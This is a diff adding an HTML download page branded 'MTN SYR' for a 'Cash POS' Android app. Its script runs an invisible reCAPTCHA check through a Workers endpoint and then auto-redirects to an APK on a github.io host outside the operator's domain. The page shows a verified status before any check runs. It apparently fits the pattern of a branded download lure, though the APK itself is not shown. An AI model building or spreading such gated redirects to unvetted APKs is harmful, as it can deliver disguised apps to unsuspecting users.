@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <!-- Meta tags for proper character encoding and responsiveness -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Page Title -->
+    <title>Cash POS App</title>
+
+    <!-- Open Graph Meta Tags for link preview -->
+    <meta property="og:title" content="Cash POS App">
+    <meta property="og:description" content="">
+    
+    <!-- Important: Full URL to the image for preview -->
+    <meta property="og:image" content="">
+    
+    <!-- Optional but recommended: specify image dimensions -->
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+
+    <!-- The actual URL of the page being shared -->
+    <meta property="og:url" content="">
+    
+    <!-- Website type -->
+    <meta property="og:type" content="website">
+
+    <!-- Optional: Name of the website or app -->
+    <meta property="og:site_name" content="MTN SYR">
+
+    <!-- Optional: Twitter Card tags if you'd like a Twitter-specific preview -->
+    <meta name="twitter:card" content="large_image">
+    <meta name="twitter:title" content="Cash POS App">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="">
+        <!-- reCAPTCHA v3 client script -->
+    <script type="text/javascript" async="" charset="utf-8" src="https://www.gstatic.com/recaptcha/releases/gTpTIWhbKpxADzTzkcabhXN4/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-H/5bR8BVxoDZIIp1lThXvsuAj/gHvImPQ0kayVpCevmOrRalo0FwJubK3EoX8w37"></script><script src="https://www.google.com/recaptcha/api.js?render=6Lez18QrAAAAAHRVudPm3hSQZMkAlFN-2ilGylQP"></script>
+
+    <!-- Minimal CSS -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #fff;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 20px;
+            border-bottom: 1px solid #ddd;
+        }
+        header img {
+            height: 50px;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 1.5em;
+            flex: 1;
+            text-align: center;
+        }
+        .lang-select {
+            font-size: 1em;
+            padding: 5px;
+        }
+        .app-title {
+            margin: 20px 0 10px;
+            font-size: 1.3em;
+            font-weight: bold;
+        }
+        .app-image {
+            max-width: 80%;   /* instead of fixed 200px */
+            height: auto;
+            margin: 10px auto;
+            display: block;
+        }
+        .lang-text {
+            display: none;
+            max-width: 90%;   /* instead of 700px */
+            word-wrap: break-word;
+            margin: 20px auto;
+            text-align: left;
+            line-height: 1.5em;
+        }
+        .lang-text[dir="rtl"] {
+            text-align: right;
+        }
+
+        .lang-text.active {
+            display: block;
+        }
+        #status {
+            margin-top: 30px;
+            font-weight: bold;
+            font-size: 1.1em;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    
+
+    <!-- Header -->
+    <header>
+        <img src="https://res.cloudinary.com/dlfmnem2s/image/upload/v1758022307/IMG_20250916_143135_042_gjttbs.png" alt="MTN Logo">
+        <h1>MTN SYR</h1>
+        <select class="lang-select" id="langSelect">
+            <option value="ar">العربية</option>
+            <option value="en">English</option>
+        </select>
+    </header>
+
+    <!-- App Title -->
+    <div class="app-title">Cash POS app</div>
+
+    <!-- App Image -->
+    <img class="app-image" src="https://imtn.mtnsyr.com:16060/customerCare/static/Application/17497251852054535.png" alt="App Image">
+
+    <!-- Language Texts -->
+    <div id="enText" class="lang-text ">
+        <p>
+            This application is used to register merchant accounts and use the POS devices.<br>
+Before using the MTN POS mobile application, it is necessary to create a merchant account.<br>
+Please follow the steps outlined on our official website or visit the nearest service center.<br>
+        </p>
+    </div>
+
+    <div id="arText" class="lang-text active" dir="rtl">
+        <p>
+            يستخدم هذا التطبيق لتسجيل حسابات التجار ولاستخدام الأجهزة الخاصة بنقاط البيع.<br>
+قبل استخدام تطبيق MTN POS للهاتف المحمول، من الضروري إنشاء حساب تاجر له.<br>
+ يرجى اتباع الخطوات الموضحة ضمن موقعنا الرسمي او زيارة اقرب مركز خدمة.<br>
+        </p>
+    </div>
+
+    <!-- Status -->
+    <p id="status">Verified ✓ Redirecting to download...</p>
+
+    <!-- Scripts -->
+    <script>
+        // Language Switcher
+        const langSelect = document.getElementById('langSelect');
+        const enText = document.getElementById('enText');
+        const arText = document.getElementById('arText');
+
+        langSelect.addEventListener('change', () => {
+            if (langSelect.value === 'en') {
+                enText.classList.add('active');
+                arText.classList.remove('active');
+            } else {
+                arText.classList.add('active');
+                enText.classList.remove('active');
+            }
+        });
+
+        // Download Verification
+        const SITE_KEY = '6Lez18QrAAAAAHRVudPm3hSQZMkAlFN-2ilGylQP';
+        const WORKER_URL = 'https://recabachav3.digitalservices-mtn.workers.dev/';
+        const DOWNLOAD_URL = 'https://devdigitalmtn.github.io/cash_pos/assets/Cash_Mobile_POS_v02.apk'
+
+        const statusEl = document.getElementById('status');
+        function setStatus(t){ statusEl.textContent = t; }
+
+        grecaptcha.ready(() => {
+            setStatus('Running security check...');
+            grecaptcha.execute(SITE_KEY, { action: 'download' }).then(token => {
+                fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token, action: 'download' })
+                })
+                .then(r => r.json())
+                .then(json => {
+                    if (json.success) {
+                        setStatus('Verified ✓ Redirecting to download...');
+                        // Delay increased to 4 seconds
+                        setTimeout(() => window.location.href = DOWNLOAD_URL, 4000);
+                    } else {
+                        setStatus('Verification failed. Try again later.');
+                    }
+                })
+                .catch(err => {
+                    console.error(err);
+                    setStatus('Network or server error during verification.');
+                });
+            });
+        });
+    </script>
+
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-rnxikl8zgyeb" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Lez18QrAAAAAHRVudPm3hSQZMkAlFN-2ilGylQP&amp;co=aHR0cHM6Ly9kZXZkaWdpdGFsbXRuLmdpdGh1Yi5pbzo0NDM.&amp;hl=en&amp;v=gTpTIWhbKpxADzTzkcabhXN4&amp;size=invisible&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=tp904afsl4t9"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div></body></html>
